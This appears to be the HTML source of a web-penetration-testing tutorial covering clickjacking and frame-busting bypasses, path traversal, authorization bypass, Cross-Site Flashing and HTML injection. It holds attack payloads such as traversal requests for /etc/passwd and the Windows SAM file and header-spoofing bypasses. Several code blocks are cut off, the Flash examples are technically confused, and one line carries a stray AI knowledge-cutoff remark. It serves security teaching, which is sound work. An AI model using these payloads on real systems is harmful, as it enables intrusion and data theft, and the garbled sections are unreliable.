      <p>Example:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://target site"</span> <span class="na">sandbox</span><span class="nt">&gt;&lt;/iframe&gt;</span>
      </code></pre>
      </div>
      </div>
      <ul>
      <li>Design mode: Paul Stone showed a security issue concerning the &ldquo;designMode&rdquo; that can be turned on in the framing page (via document.designMode), disabling JavaScript in top and sub-frame. The design mode is currently implemented in Firefox and IE8.</li>
      </ul>
      <h5 id="onbeforeunload-event">OnBeforeUnload Event</h5>
      <p>The <code class="language-plaintext highlighter-rouge">onBeforeUnload</code> event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target&rsquo;s frame busting attempt.</p>
      <p>The attacker can use this attack by registering an unload event on the top page using the following example code:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>www.fictitious.site<span class="nt">&lt;/h1&gt;</span>
      <span class="nt">&lt;script&gt;</span>
          <span class="nb">window</span><span class="p">.</span><span class="nx">onbeforeunload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span>
          <span class="p">{</span>
              <span class="k">return</span> <span class="dl">"</span><span class="s2"> Do you want to leave fictitious.site?</span><span class="dl">"</span><span class="p">;</span>
          <span class="p">}</span>
      <span class="nt">&lt;/script&gt;</span>
      <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://target site"</span><span class="nt">&gt;</span>
      </code></pre>
      </div>
      </div>
      <p>The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a &ldquo;HTTP/1.1 204 No Content&rdquo; header.</p>
      <p>Since with this response the browser will do nothing, the resulting of this operation is the flushing of the request pipeline, rendering the original frame busting attempt futile.</p>
      <p>Following an example code:</p>
      <p>204 page:</p>
      <div class="language-php highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="cp">&lt;?php</span>
          <span class="nb">header</span><span class="p">(</span><span class="s2">"HTTP/1.1 204 No Content"</span><span class="p">);</span>
      <span class="cp">?&gt;</span>
      </code></pre>

      <h5 id="xss-filter">XSS Filter</h5>
      <p>Starting from Google Chrome 4.0 and from IE8 there were introduced XSS filters to protect users from reflected XSS attacks. Nava and Lindsay have observed that these kind of filters can be used to deactivate frame busting code by faking it as malicious code.</p>
      <ul>
      <li><strong>IE8 XSS filter</strong>: this filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request&rsquo;s parameters.</li>
      </ul>
      <p>Example: Target web page frame busting code:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
          <span class="k">if</span> <span class="p">(</span> <span class="nx">top</span> <span class="o">!=</span> <span class="nb">self</span> <span class="p">)</span>
          <span class="p">{</span>
              <span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">self</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
          <span class="p">}</span>
      <span class="nt">&lt;/script&gt;</span>
      </code></pre>
      </div>
      </div>
      <p>Attacker code:</p>
      <div class="language-html highlighter-rouge">

      </code></pre>
      </div>
      </div>
      <ul>
      <li><strong>Chrome 4.0 XSSAuditor filter</strong>: It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a &ldquo;script&rdquo; by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.</li>
      </ul>
      <p>Example: Target web page frame busting code:</p>
      <div class="language-html highlighter-rouge">

      <h5 id="redefining-location">Redefining Location</h5>
      <p>For several browser the &ldquo;document.location&rdquo; variable is an immutable attribute. However, for some version of Internet Explorer and Safari, it is possible to redefine this attribute. This fact can be exploited to evade frame busting code.</p>
      <ul>
      <li><strong>Redefining location in IE7 and IE8</strong>: it is possible to redefine &ldquo;location&rdquo; as it is illustrated in the following example. By defining &ldquo;location&rdquo; as a variable, any code that tries to read or to navigate by assigning &ldquo;top.location&rdquo; will fail due to a security violation and so the frame busting code is suspended.</li>
      </ul>
      <p>Example:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nt">&lt;script&gt;</span>

      </div>
      <ul>
      <li><strong>Redefining location in Safari 4.0.4</strong>: To bust frame busting code with &ldquo;top.location&rdquo; it is possible to bind &ldquo;location&rdquo; to a function via defineSetter (through window), so that an attempt to read or navigate to the &ldquo;top.location&rdquo; will fail.</li>
      </ul>
      <p>Example:</p>
      <div class="language-html highlighter-rouge">
      <div class="highlight">

      <h4 id="server-side-protection-x-frame-options">Server side protection: X-Frame-Options</h4>
      <p>An alternative approach to client side frame busting code was implemented by Microsoft and it consists of an header based defense. This new &ldquo;X-FRAME-OPTIONS&rdquo; header is sent from the server on HTTP responses and is used to mark web pages that shouldn&rsquo;t be framed. This header can take the values DENY, SAMEORIGIN, ALLOW-FROM origin, or non-standard ALLOWALL. Recommended value is DENY.</p>
      <p>The &ldquo;X-FRAME-OPTIONS&rdquo; is a very good solution, and was adopted by major browser, but also for this technique there are some limitations that could lead in any case to exploit the clickjacking vulnerability.</p>
      <h5 id="browser-compatibility">Browser Compatibility</h5>
      <p>Since the &ldquo;X-FRAME-OPTIONS&rdquo; was introduced in 2009, this header is not compatible with old browser. So every user that doesn&rsquo;t have an updated browser could be victim of clickjacking attack.</p>

      <h5 id="proxies">Proxies</h5>
      <p>Web proxies are known for adding and stripping headers. In the case in which a web proxy strips the &ldquo;X-FRAME-OPTIONS&rdquo; header then the site loses its framing protection.</p>
      <h5 id="mobile-website-version-1">Mobile Website Version</h5>
      <p>Also in this case, since the <code class="language-plaintext highlighter-rouge">X-FRAME-OPTIONS</code> has to be implemented in every page of the website, the developers may have not protected the mobile version of the website.</p>
      <h3 id="create-a-proof-of-concept">Create a Proof of Concept</h3>
      <p>Once we have discovered that the site we are testing is vulnerable to clickjacking attack, we can proceed with the development of a <code class="language-plaintext highlighter-rouge">proof of concept</code> (PoC) to demonstrate the vulnerability. It is important to note that, as mentioned previously, these attacks can be used in conjunction with other forms of attacks (for example CSRF attacks) and could lead to overcome anti-CSRF tokens. In this regard we can imagine that, for example, the target site allows to authenticated and authorized users to make a transfer of money to another account.</p>
      <p>Suppose that to execute the transfer the developers have planned three steps. In the first step the user fill a form with the destination account and the amount. In the second step, whenever the user submits the form, is presented a summary page asking the user confirmation (like the one presented in the following picture).</p>

      <p>As you can see the code is protected from CSRF attack both with a random token generated in the second step and accepting only variable passed via POST method. In this situation an attacker could forge a CSRF + Clickjacking attack to evade anti-CSRF protection and force a victim to do a money transfer without her consent.</p>
      <p>The target page for the attack is the second step of the money transfer procedure. Since the developers put the security controls only in the last step, thinking that this is secure enough, the attacker could pass the account and amount parameters via GET method.</p>

  <h1>Path Traversal Techniques</h1></br>

      <h4>Path traversal attacks, also known as directory traversal attacks, are a type of attack that allows an attacker to access files and directories outside of the intended application directory. Here are some techniques that you can use to identify and exploit path traversal vulnerabilities:</h4>

      <ol>
          <li>
              <h2>Basic directory traversal:</h2>
              <p>The most basic type of path traversal attack involves using dot-dot-slash (../) sequences to navigate outside of the intended directory. For example, an attacker may attempt to access a file outside of the application directory by using the following request:</p>
              <pre><code>http://example.com/vulnerable_script.php?file=../sensitive_file.txt</code></pre>
              <p>In this example, the attacker is attempting to access the `sensitive_file.txt` file located one directory above the application directory.</p>
          </li>

          <li>
              <h2>URL encoding:</h2>
              <p>Some applications may attempt to prevent basic directory traversal attacks by filtering out dot-dot-slash sequences. However, this defense can be bypassed by using URL encoding techniques. For example, an attacker may encode the dot-dot-slash sequence as `%2e%2e%2f` or `%2e%2e/%2e%2e%2f` to bypass the filter.</p>
          </li>

          <li>
              <h2>Double encoding:</h2>
              <p>Some applications may attempt to prevent URL encoding attacks by decoding the URL before processing it. However, this defense can be bypassed by using double encoding techniques. For example, an attacker may encode the dot-dot-slash sequence twice to bypass the filter.</p>
              <pre><code>http://example.com/vulnerable_script.php?file=%252e%252e%252f..%252fsensitive_file.txt</code></pre>
              <p>In this example, the attacker is encoding the dot-dot-slash sequence as `%252e%252e%252f`, which decodes to `%2e%2e%2f`. The `%2f` character at the end of the sequence is then decoded to `/`, resulting in a valid directory traversal attack.</p>
          </li>

          <li>
              <h2>Unicode encoding:</h2>
              <p>Some applications may attempt to prevent URL encoding attacks by filtering out non-ASCII characters. However, this defense can be bypassed by using Unicode encoding techniques.</p>
              <pre><code>http://example.com/vulnerable_script.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae%c0%ae</code></pre>
          </li>

          <li>
              <h2>Absolute path traversal:</h2>
              <p>Some applications may allow the use of absolute paths in requests. An attacker can exploit this vulnerability by specifying an absolute path to a sensitive file.</p>
              <pre><code>http://example.com/vulnerable_script.php?file=/etc/passwd</code></pre>
          </li>

          <li>
              <h2>Backslashes:</h2>
              <p>Some applications may use backslashes (`\`) instead of forward slashes (`/`) to separate directories. An attacker can exploit this vulnerability by using backslashes to traverse the directory structure.</p>
              <pre><code>http://example.com/vulnerable_script.php?file=..\..\..\windows\system32\config\sam</code></pre>
          </li>

          <li>
              <h2>Null bytes:</h2>
              <p>Some applications may not properly handle null bytes (`\0`) in file paths. An attacker can exploit this vulnerability by including null bytes in the file path to bypass filters and access sensitive files.</p>
              <pre><code>http://example.com/vulnerable_script.php?file=../../../../../../../etc/passwd%00</code></pre>
          </li>

    <li>Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?</li>
    </ul>
    <p>For each role:</p>
    <ol>

    <li>Establish and keep two different sessions active (one for each user).</li>
    <li>For every request, change the relevant parameters and the session identifier from token one to token two and diagnose the responses for each token.</li>
    <li>An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users&rsquo; resource or data.</li>

    <p>For example, suppose that the <code class="language-plaintext highlighter-rouge">viewSettings</code> function is part of every account menu of the application with the same role, and it is possible to access it by requesting the following URL: <code class="language-plaintext highlighter-rouge">https://www.example.com/account/viewSettings</code>.

    <h3 id="testing-for-vertical-bypassing-authorization-schema">Testing for Vertical Bypassing Authorization Schema</h3>
    <p>A vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:</p>
    <ul>
    <li>Access resources that should be accessible only to a higher role user.</li>
    <li>Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.</li>
    </ul>
    <p>For each role:</p>
    <ol>
    <li>Register a user.</li>
    <li>Establish and maintain two different sessions based on the two different roles.</li>
    <li>For every request, change the session identifier from the original to another role&rsquo;s session identifier and evaluate the responses for each.</li>
    <li>An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate successful operations on higher privileged functions.</li>
    </ol>

    <p>Suppose that the administrator menu is part of the administrator account.</p>
    <p>The application will be considered vulnerable if any role other than administrator could access the administrator menu.

    <h3 id="testing-for-access-to-resources-assigned-to-a-different-role">Testing for Access to Resources Assigned to a Different Role</h3>
    <p>Various applications setup resource controls based on user roles. Let&rsquo;s take an example resumes or CVs (curriculum vitae) uploaded on a careers form to an S3 bucket.</p>
    <p>As a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them, then the application is vulnerable.</p>
    <h3 id="testing-for-special-request-header-handling">Testing for Special Request Header Handling</h3>
    <p>Some applications support non-standard headers such as <code class="language-plaintext highlighter-rouge">X-Original-URL</code> or <code class="language-plaintext highlighter-rouge">X-Rewrite-URL</code> in order to allow overriding the target URL in requests with the one specified in the header value.</p>
    <p>This behavior can be leveraged in a situation in which the application is behind a component that applies access control restriction based on the request URL.</p>
    <p>The kind of access control restriction based on the request URL can be, for example, blocking access from Internet to an administration console exposed on <code class="language-plaintext highlighter-rouge">/console</code> or <code class="language-plaintext highlighter-rouge">/admin</code>.</p>
    <p>To detect the support for the header <code class="language-plaintext highlighter-rouge">X-Original-URL</code> or <code class="language-plaintext highlighter-rouge">X-Rewrite-URL</code>, the following steps can be applied.</p>

    </div>
    <p>If the response for either request contains markers that the resource was not found, this indicates that the application supports the special request headers. These markers may include the HTTP response status code 404, or a &ldquo;resource not found&rdquo; message in the response body.</p>
    <p>Once the support for the header <code class="language-plaintext highlighter-rouge">X-Original-URL</code> or <code class="language-plaintext highlighter-rouge">X-Rewrite-URL</code> was validated then the tentative of bypass against the access control restriction can be leveraged by sending the expected request to the application but specifying a URL &ldquo;allowed&rdquo; by the front-end component as the main request URL and specifying the real target URL in the <code class="language-plaintext highlighter-rouge">X-Original-URL</code> or <code class="language-plaintext highlighter-rouge">X-Rewrite-URL</code> header depending on the one supported. If both are supported then try one after the other to verify for which header the bypass is effective.</p>
    <h4 id="4-other-headers-to-consider">4. Other Headers to Consider</h4>
    <p>Often admin panels or administrative related bits of functionality are only accessible to clients on local networks, therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers and values to test with are:</p>

    <li>Headers:
    <ul>
    <li><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code></li>

	      <sl-details summary="Vertical Access" open>
	      <h4>Vertical access refers to the ability of users or systems to gain access to resources or functionalities at different levels or layers within an application or organization. It typically involves permissions or access control rules that define what a user can do at different levels of the system, such as administrators, regular users, or restricted access users.</h4>

    <h2>Why is Vertical Access Important?</h2>
    <p>Vertical access is crucial for maintaining security within an application, ensuring that different types of users only have access to the data and actions they are authorized to use. Without proper vertical access control, users could gain access to sensitive information or perform operations outside their assigned roles, leading to:</p>
    <ul>
        <li><strong>Privilege Escalation:</strong> Attackers or unauthorized users may gain higher-level access or permissions than they are authorized to have, allowing them to modify, delete, or leak sensitive data.</li>
        <li><strong>Data Breaches:</strong> Inadequate vertical access controls can allow unauthorized access to personal, financial, or business-critical data.</li>
        <li><strong>Improper Role Management:</strong> Without proper distinction between different user roles and their capabilities, important actions might be exposed to less trusted users.</li>
    </ul>

    <h2>Key Aspects of Vertical Access</h2>
    <p>Vertical access focuses on the hierarchical layers within a system and the permissions associated with each level. The following are key aspects:</p>
    <ul>
        <li><strong>User Roles and Permissions:</strong> The ability to define different roles within an application (e.g., Admin, User, Moderator) and assign specific access rights and actions to each role.</li>
        <li><strong>Least Privilege Principle:</strong> Users should only be given the minimum level of access necessary for their role, ensuring they cannot access or manipulate resources beyond their required scope.</li>
        <li><strong>Access Control Lists (ACLs):</strong> These are used to define permissions for specific users or groups, determining which resources they can interact with and what actions they can perform.</li>
        <li><strong>Role-Based Access Control (RBAC):</strong> A system of managing access by assigning users to specific roles, where each role has a set of permissions that dictate what resources and actions a user can access.</li>
        <li><strong>Separation of Duties:</strong> Ensuring that sensitive tasks or data are divided among multiple users, so no single user has access to both critical systems and the ability to alter or manipulate them.</li>
    </ul>

    <h2>Vertical Access Control Models</h2>
    <p>Vertical access control can be achieved using several models, including:</p>
    <ul>
        <li><strong>Role-Based Access Control (RBAC):</strong> This model is based on defining roles within the organization, with each role granted certain permissions. Users are assigned to roles, and access to resources is determined by the role’s permissions.</li>
        <li><strong>Attribute-Based Access Control (ABAC):</strong> In this model, access is based on attributes (e.g., user, resource, or environment attributes), allowing for more granular control based on user characteristics and conditions.</li>
        <li><strong>Mandatory Access Control (MAC):</strong> A model that enforces policies defined by the system administrator, often used in highly secure systems, where access is determined by the system's security classification, not the user’s role.</li>
        <li><strong>Discretionary Access Control (DAC):</strong> This model allows resource owners to control access to their resources, but it can be less secure than RBAC or MAC because users have more flexibility in granting access.</li>
    </ul>

    <h2>Challenges with Vertical Access</h2>
    <p>While vertical access is critical for security, there are several challenges associated with its implementation:</p>
    <ul>
        <li><strong>Complex Role Management:</strong> As organizations grow, managing the roles and permissions of users can become complicated. Roles might need to be frequently adjusted to reflect changes in users’ responsibilities.</li>
        <li><strong>Privilege Creep:</strong> Over time, users may accumulate unnecessary privileges as their roles change, leading to excessive access. Regular audits are necessary to prevent privilege creep.</li>
        <li><strong>Scalability:</strong> As systems grow in complexity, managing access for a large number of users and roles becomes more challenging, especially in systems with diverse resources.</li>
        <li><strong>Misconfiguration:</strong> Incorrectly configured permissions or ACLs can unintentionally expose sensitive resources or limit legitimate users' access to necessary functions.</li>
    </ul>

    <h2>Best Practices for Implementing Vertical Access</h2>
    <p>To manage vertical access securely and effectively, follow these best practices:</p>
    <ul>
        <li><strong>Implement Role-Based Access Control (RBAC):</strong> Clearly define roles within your organization and assign appropriate permissions to each role. Ensure that users only have access to what they need to perform their tasks.</li>
        <li><strong>Apply the Principle of Least Privilege:</strong> Ensure users have the minimal set of permissions necessary for their job function. This reduces the risk of unauthorized access or misuse of system resources.</li>
        <li><strong>Regularly Review and Update Permissions:</strong> Conduct regular audits of user roles and permissions to ensure that users’ access levels remain appropriate as their roles or responsibilities change.</li>
        <li><strong>Use Multi-Factor Authentication (MFA):</strong> Protect sensitive accounts with additional layers of security, such as MFA, to ensure that even if access controls fail, attackers cannot easily gain unauthorized access.</li>
        <li><strong>Monitor and Log Access Events:</strong> Track access patterns and log who accessed what resources and when. Monitoring helps detect suspicious activity and identify potential misconfigurations or attacks.</li>
    </ul>

  </div>
  <div class="tab-pane fade" id="horizontal-access" role="tabpanel" aria-labelledby="horizontal-access-tab">    <sl-details summary="Horizontal Access" open>
	    <h4>Horizontal access refers to the ability of a user or system to access resources, data, or functionalities at the same level within an application or environment. This type of access is typically restricted to ensure that users cannot access data or functions that are beyond their intended scope, even if they share the same level or role within a system.</h4>

    <h2>Why is Horizontal Access Important?</h2>
    <p>Horizontal access is crucial for ensuring that users with the same privileges cannot interfere with or access each other’s data or functionalities. Without proper horizontal access controls, users may exploit the system to access or manipulate data they should not be able to, leading to:</p>
    <ul>
        <li><strong>Data Exposure:</strong> A user with improper horizontal access may be able to view or modify another user’s personal or sensitive data.</li>
        <li><strong>Privilege Escalation:</strong> Misconfigured horizontal access may allow a user to gain additional capabilities beyond what is authorized, escalating their privileges.</li>
        <li><strong>Cross-Site Resource Leakage:</strong> Unauthorized horizontal access may allow users to gain insights into other users' interactions or access session data.</li>
    </ul>

    <h2>Key Aspects of Horizontal Access</h2>
    <p>Horizontal access management involves controlling the ability of users to interact with data or resources of other users at the same level of privilege. Important aspects include:</p>
    <ul>
        <li><strong>Role-Based Access Control (RBAC):</strong> Even if users share the same role, horizontal access ensures that they can only interact with their own resources or authorized data, not others' resources.</li>
        <li><strong>Access Control Lists (ACLs):</strong> These lists can specify permissions for different resources or objects within a system, defining who can access what data and ensuring horizontal access controls are in place.</li>
        <li><strong>Session Management:</strong> Proper session handling can prevent one user from accessing another user’s data by mistakenly or maliciously exploiting the session information.</li>
        <li><strong>Resource Isolation:</strong> Ensuring that users' data, files, or sessions are isolated from others, even when they share the same access levels, is essential for preventing unauthorized horizontal access.</li>
    </ul>

    <h2>Challenges with Horizontal Access</h2>
    <p>Properly managing horizontal access can present several challenges:</p>
    <ul>
        <li><strong>Insufficient Validation:</strong> If the system does not properly validate the user’s identity and ownership of resources, users may gain access to resources they should not be able to see.</li>
        <li><strong>Improper Data Segmentation:</strong> Without proper segmentation, users may have access to entire datasets, including others' private information, when they should only access their own data.</li>
        <li><strong>Inconsistent Access Control:</strong> Misconfigured access control settings can result in situations where some users can access or modify data that belongs to others, especially if there are multiple data access points within the system.</li>
    </ul>

    <h2>Best Practices for Managing Horizontal Access</h2>
    <p>To ensure horizontal access is managed securely and efficiently, consider the following best practices:</p>
    <ul>
        <li><strong>Enforce User Data Isolation:</strong> Make sure that users cannot view or modify data or resources that do not belong to them, even if they share the same role or privileges.</li>
        <li><strong>Use Access Control Lists (ACLs):</strong> Implement ACLs to define which users have access to specific resources, ensuring only authorized users can interact with specific data.</li>
        <li><strong>Apply Fine-Grained Authorization:</strong> Use attributes such as user ID, group membership, or data ownership to determine what a user can access and ensure proper horizontal access controls are applied.</li>
        <li><strong>Monitor and Log User Activities:</strong> Keeping track of user activities, especially regarding data access and modifications, can help detect potential horizontal access violations and suspicious behaviors.</li>
        <li><strong>Regularly Review Access Control Settings:</strong> Conduct periodic audits to ensure that horizontal access controls are enforced and updated to reflect any changes in user roles or data structures.</li>
    </ul>

    <h2>Horizontal Access Control Models</h2>
    <p>Horizontal access control can be implemented using different models:</p>
    <ul>
        <li><strong>Discretionary Access Control (DAC):</strong> In DAC systems, users have the ability to control access to their own resources, but improper implementation can allow users to access other users' data if not restricted properly.</li>
        <li><strong>Role-Based Access Control (RBAC):</strong> While RBAC primarily addresses vertical access, it can also help enforce horizontal access when roles are tied to specific data sets or resources.</li>
        <li><strong>Attribute-Based Access Control (ABAC):</strong> ABAC can help manage horizontal access by using attributes (e.g., resource owner, user identifier) to determine whether a user can access a specific resource or data.</li>
        <li><strong>Mandatory Access Control (MAC):</strong> MAC enforces a strict policy where access to data and resources is determined by the system, rather than the user. This can help mitigate horizontal access vulnerabilities by tightly controlling data access.</li>
    </ul>

    <h2>Testing for Horizontal Access Vulnerabilities</h2>
    <p>To test for horizontal access issues, consider the following approaches:</p>
    <ul>
        <li><strong>Access Control Testing:</strong> Check if users can access other users' data or actions by manipulating URLs, API calls, or other input fields.</li>
        <li><strong>Session Testing:</strong> Verify if session identifiers are appropriately tied to the correct user and cannot be reused or manipulated by other users.</li>
        <li><strong>Privilege Escalation Attempts:</strong> Test whether unauthorized users can escalate their privileges to access data or actions belonging to other users.</li>
    </ul>

	        <h4>Missing authorization refers to the absence or failure to properly enforce authorization mechanisms in a web application or system. It occurs when a system fails to verify whether a user is allowed to access a particular resource, action, or functionality. This lack of proper authorization controls can lead to security vulnerabilities, such as unauthorized access to sensitive data, privilege escalation, and exploitation by attackers.</h4>

    <h2>Why is Missing Authorization Dangerous?</h2>
    <p>When proper authorization checks are missing, users can gain access to data, resources, or functionalities they should not be able to. The risks of missing authorization include:</p>
    <ul>
        <li><strong>Unauthorized Data Access:</strong> Attackers or unauthorized users can view, modify, or delete sensitive data that they are not permitted to access.</li>
        <li><strong>Privilege Escalation:</strong> Users may gain higher privileges or administrative rights without the proper permissions, allowing them to perform unauthorized actions.</li>
        <li><strong>Exposure of Sensitive Information:</strong> Without proper authorization, sensitive information, such as personal data, credentials, or financial details, may be exposed to unauthorized parties.</li>
        <li><strong>Increased Attack Surface:</strong> The absence of authorization checks increases the opportunities for attackers to exploit vulnerabilities in the system.</li>
    </ul>

    <h2>Common Causes of Missing Authorization</h2>
    <p>There are several reasons why missing authorization may occur in a system:</p>
    <ul>
        <li><strong>Improper Access Control Configuration:</strong> The system may lack proper configuration for access control, allowing users to bypass authorization checks.</li>
        <li><strong>Missing Role-Based Authorization:</strong> Failure to implement role-based access control (RBAC) or other access models can lead to situations where users access unauthorized resources.</li>
        <li><strong>Lack of Verification for Sensitive Operations:</strong> Systems may not verify whether the user has the necessary permissions before performing sensitive operations such as transferring funds, updating user profiles, or deleting data.</li>
        <li><strong>Inadequate Session Management:</strong> If a session is not properly managed, users may be able to perform unauthorized actions due to session hijacking or poor session validation.</li>
        <li><strong>Weak API Security:</strong> In web applications using APIs, missing authorization may occur if the API fails to properly authenticate and authorize the user before granting access to sensitive data or services.</li>
    </ul>

    <h2>Examples of Missing Authorization Vulnerabilities</h2>
    <p>Here are some typical examples where missing authorization vulnerabilities can occur:</p>
    <ul>
        <li><strong>Unprotected Admin Pages:</strong> An application may expose administrative interfaces (e.g., /admin) without requiring proper authentication or authorization, allowing anyone who can access the page to perform admin-level actions.</li>
        <li><strong>Insecure Direct Object References (IDOR):</strong> This vulnerability occurs when an application allows users to access or modify objects (e.g., files, database records) by simply manipulating input parameters, such as URLs or form fields, without checking if the user is authorized to access the resource.</li>
        <li><strong>Unrestricted Access to Sensitive API Endpoints:</strong> APIs that lack proper authorization mechanisms may allow unauthorized users to access endpoints that return sensitive data, such as user profiles, transaction histories, or authentication tokens.</li>
        <li><strong>Misconfigured Third-Party Services:</strong> If third-party integrations or services do not enforce adequate authorization, users may gain unintended access to sensitive data or functionalities from external services.</li>
    </ul>

    <h2>Best Practices to Prevent Missing Authorization</h2>
    <p>To prevent missing authorization vulnerabilities, consider implementing the following best practices:</p>
    <ul>
        <li><strong>Enforce Role-Based Access Control (RBAC):</strong> Ensure that users are only granted access to resources and actions that are appropriate for their role or privilege level. Role-based access control helps prevent unauthorized access to sensitive resources.</li>
        <li><strong>Use Attribute-Based Access Control (ABAC):</strong> Implement attribute-based access control to fine-tune permissions based on various attributes like user identity, data ownership, and resource type.</li>
        <li><strong>Implement Proper Access Control for Sensitive Operations:</strong> Always verify the user’s authorization before allowing them to perform sensitive operations like updating records, making payments, or deleting data.</li>
        <li><strong>Enforce Authorization Checks on All Endpoints:</strong> Ensure that authorization checks are applied consistently across all application endpoints, including APIs and background services.</li>
        <li><strong>Secure APIs:</strong> Protect API endpoints with strong authentication and authorization measures to prevent unauthorized access to sensitive data or operations. Ensure that all APIs validate the user's permissions before granting access.</li>
        <li><strong>Use Multi-Factor Authentication (MFA):</strong> Implement MFA where possible, especially for actions that require higher privileges or access to sensitive data.</li>
        <li><strong>Regularly Review and Update Access Controls:</strong> Conduct regular security reviews to ensure that access controls are up-to-date, and adjust them as needed based on changes in user roles, resource configurations, or system functionality.</li>
    </ul>

    <h2>Testing for Missing Authorization Vulnerabilities</h2>
    <p>To test for missing authorization vulnerabilities, use the following approaches:</p>
    <ul>
        <li><strong>Attempt Unauthorized Access:</strong> Try accessing pages, resources, or functionalities that should be restricted to certain users to see if proper authorization is enforced.</li>
        <li><strong>Manipulate URLs or Parameters:</strong> Modify URLs or input parameters to check if unauthorized access to sensitive resources or actions is possible (e.g., changing user IDs in the URL).</li>
        <li><strong>Review API Endpoints:</strong> Test API endpoints to ensure that all requests are properly authenticated and authorized before granting access to data or operations.</li>
        <li><strong>Perform Access Control Audits:</strong> Review the system's access control configuration, ensuring that no unauthorized users can access protected resources.</li>
    </ul>

    <sl-details summary="Cross-Site Flashing (XFS)" open>

  <p>Cross-Site Flashing (XSF) is a security vulnerability that occurs when an attacker can inject malicious Adobe Flash content into a web application, and that content is executed within the context of a victim's browser. This vulnerability is a specific type of Cross-Site Scripting (XSS) that targets Flash objects embedded in web pages. </p>


  <h1>Cross-Site Flashing Examples</h1>

  <h2>Example 1: Basic Cross-Site Flashing Attack</h2>

  <p>Suppose a web application dynamically embeds a Flash object based on user input without proper validation:</p>

  <pre><code>&lt;!-- Vulnerable Code --&gt;
  &lt;embed src="userInput.swf" width="500" height="300"&gt;</code></pre>

  <p>An attacker could inject malicious Flash content:</p>

  <pre><code>&lt;script&gt;alert("XSF Attack");&lt;/script&gt;</code></pre>

  <p>If the web application fails to properly validate or sanitize user input, the injected Flash content might be included:</p>

  <pre><code>&lt;embed src="&lt;script&gt;alert('XSF Attack');&lt;/script&gt;" width="500" height="300"&gt;</code></pre>

  <p>When a victim accesses a page containing this injected Flash content, the malicious code runs within the context of the web application, leading to a successful Cross-Site Flashing attack.</p>

  <h2>Example 2: Exploiting Flash Parameter</h2>

  <p>Consider a web application that allows users to customize Flash parameters in a URL:</p>

  <pre><code>&lt;!-- Vulnerable Code --&gt;
  &lt;embed src="userInput.swf?bgcolor=FFFFFF" width="500" height="300"&gt;</code></pre>

  <p>An attacker could inject a payload:</p>

  <pre><code">"&lt;script&gt;alert("XSF Attack");&lt;/script&gt;&lt;!--</code></pre>

  <p>The injected Flash parameter might look like this:</p>

  <pre><code>&lt;embed src="userInput.swf?bgcolor=FFFFFF"&gt;&lt;script&gt;alert("XSF Attack");&lt;/script&gt;&lt;!--" width="500" height="300"&gt;</code></pre>

  <p>When the victim loads the page with the manipulated Flash parameter, the injected script executes, leading to a successful Cross-Site Flashing attack.</p>

  <h2>Mitigation Strategies:</h2>

  <ol>
    <li><strong>Input Validation and Sanitization:</strong> Ensure that user inputs used to generate Flash content are properly validated and sanitized to prevent malicious injections.</li>
    <li><strong>Content Security Policy (CSP):</strong> Implement and enforce a Content Security Policy that restricts the sources from which Flash content can be loaded.</li>
    <li><strong>Update Flash and Disable Flash Content:</strong> As of my last knowledge update in January 2022, Adobe Flash has been deprecated, and major browsers have disabled support for Flash content. Therefore, keeping software up-to-date and disabling Flash can help mitigate Cross-Site Flashing vulnerabilities.</li>
  </ol>

    <h1 id="testing-for-html-injection">Testing for HTML Injection</h1>
    </br>
    <p>HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user&rsquo;s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.</p>
    <p>This vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim&rsquo;s context.</p>
    <p>There is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the <code class="language-plaintext highlighter-rouge">innerHTML</code> JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is <code class="language-plaintext highlighter-rouge">document.write()</code>.</p>
    <p>The following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:</p>
    <div class="language-js highlighter-rouge">
    <div class="highlight">
